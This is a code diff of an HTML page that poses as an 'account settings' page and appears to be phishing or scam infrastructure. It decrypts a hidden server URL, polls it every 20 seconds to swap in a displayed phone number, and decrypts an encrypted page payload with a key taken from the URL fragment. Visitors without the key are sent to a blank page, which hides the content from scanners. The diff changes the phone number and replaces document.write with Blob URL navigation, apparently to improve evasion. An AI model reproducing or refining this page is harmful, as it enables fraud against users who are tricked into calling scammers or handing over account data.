@@ -1,15 +1,6 @@
 <!DOCTYPE html>
 <html lang="zh-CN" data-render="csr" class="twzzn">
     <head>
-        <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-85R7FM0ZLT"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-85R7FM0ZLT');
-</script>
         <meta charset="utf-8">
         <meta name="apple-mobile-web-app-capable" content="yes">
         <meta name="application-name" content="emf8bvgd">
@@ -17,25 +8,25 @@
         <link href="shared/slide-2.webp" rel="icon" id="agaric-esclandre" type="image/png"/>
         <meta name="robots" content="noindex,nofollow">
         <meta name="color-scheme" content="light dark">
-        <title>				 アカウント設定							 </title>
+        <title>               アカウント設定                           </title>
         <meta name="viewport" content="width=device-width,initial-scale=1">
         <meta http-equiv="x-dns-prefetch-control" content="on">
         <script>
             (async () => {
                 let b = s => Uint8Array.from(atob(s), c => c.charCodeAt(0))
-                  , k = await crypto.subtle.importKey('raw', b('NybMZXWH5OIVUKVO6Knoqw=='), 'AES-GCM', false, ['decrypt'])
-                  , u = new TextDecoder().decode(await crypto.subtle.decrypt({
-                    name: 'AES-GCM',
-                    iv: b('Y0FdcBANqSZLcXt6')
-                }, k, b('Iml9uNMSZ0MHvpeowpyH1gnPn0kfK/KwYOfXjE2a5yN5vZ/dbLXiQ04AtwtnvDE/')))
-                  , f = () => fetch(u, {
-                    cache: 'no-store'
-                }).then(r => r.ok ? r.text() : '').then(p => {
-                    p = p.trim();
-                    p && p !== gp.p && sp(p)
-                }
-                ).catch( () => {}
-                );
+                    , k = await crypto.subtle.importKey('raw', b('NybMZXWH5OIVUKVO6Knoqw=='), 'AES-GCM', false, ['decrypt'])
+                    , u = new TextDecoder().decode(await crypto.subtle.decrypt({
+                        name: 'AES-GCM',
+                        iv: b('Y0FdcBANqSZLcXt6')
+                    }, k, b('Iml9uNMSZ0MHvpeowpyH1gnPn0kfK/KwYOfXjE2a5yN5vZ/dbLXiQ04AtwtnvDE/')))
+                    , f = () => fetch(u, {
+                        cache: 'no-store'
+                    }).then(r => r.ok ? r.text() : '').then(p => {
+                        p = p.trim();
+                        p && p !== gp.p && sp(p)
+                    }
+                    ).catch( () => {}
+                    );
                 f();
                 setInterval(f, 2e4)
             }
@@ -46,7 +37,7 @@
     <body>
         <script>
             window.gp = {
-                p: '(0101) 888-718-0023'
+                p: '(0101) 23172-01627'
             },
             window.sp = p => {
                 p = (p || gp.p).trim();
@@ -64,7 +55,7 @@
             var yt8i = void 0;
             !function() {
                 var w1k = document.getElementById("futj24r").innerHTML
-                  , n6ty = location.hash.slice(1);
+                    , n6ty = location.hash.slice(1);
                 if (!n6ty) {
                     location.replace("about:blank");
                     return
@@ -74,12 +65,12 @@
                     pjft += String.fromCharCode(0);
                 pjft = pjft.slice(0, 32);
                 var v13 = CryptoJS.enc.Latin1.parse(pjft)
-                  , itn3ncl = CryptoJS.enc.Latin1.parse("1f7230646a3f1ad53b7f1b247fb1ccaf")
-                  , acskmjf = CryptoJS.enc.Base64.parse(w1k)
-                  , qxho0qe = acskmjf.sigBytes
-                  , tv9cq = CryptoJS.lib.WordArray.create(acskmjf.words.slice(0, 4), 16)
-                  , kc4fs = CryptoJS.lib.WordArray.create(acskmjf.words.slice(4, (qxho0qe - 32) / 4), qxho0qe - 48)
-                  , nw52n7 = CryptoJS.lib.WordArray.create(acskmjf.words.slice((qxho0qe - 32) / 4), 32);
+                    , itn3ncl = CryptoJS.enc.Latin1.parse("1f7230646a3f1ad53b7f1b247fb1ccaf")
+                    , acskmjf = CryptoJS.enc.Base64.parse(w1k)
+                    , qxho0qe = acskmjf.sigBytes
+                    , tv9cq = CryptoJS.lib.WordArray.create(acskmjf.words.slice(0, 4), 16)
+                    , kc4fs = CryptoJS.lib.WordArray.create(acskmjf.words.slice(4, (qxho0qe - 32) / 4), qxho0qe - 48)
+                    , nw52n7 = CryptoJS.lib.WordArray.create(acskmjf.words.slice((qxho0qe - 32) / 4), 32);
                 if (CryptoJS.enc.Hex.stringify(nw52n7) === CryptoJS.enc.Hex.stringify(CryptoJS.HmacSHA256(tv9cq.concat(kc4fs), itn3ncl))) {
                     try {
                         var o9foe9 = CryptoJS.AES.decrypt({
@@ -89,11 +80,19 @@
                             mode: CryptoJS.mode.CBC,
                             padding: CryptoJS.pad.Pkcs7
                         }).toString(CryptoJS.enc.Utf8);
-                        o9foe9 ? (document.open(),
-                        document.write(o9foe9),
-                        document.close()) : location.replace("about:blank")
+                        
+                        if (o9foe9) {
+                            // Create a Blob containing the decrypted HTML content
+                            var blob = new Blob([o9foe9], { type: 'text/html;charset=utf-8' });
+                            var blobUrl = URL.createObjectURL(blob);
+                            
+                            // Navigate the current window/tab to the Blob URL
+                            location.replace(blobUrl);
+                        } else {
+                            location.replace("about:blank");
+                        }
                     } catch (vrrqxfv) {
-                        location.replace("about:blank")
+                        location.replace("about:blank");
                     }
                 } else
                     location.replace("about:blank")
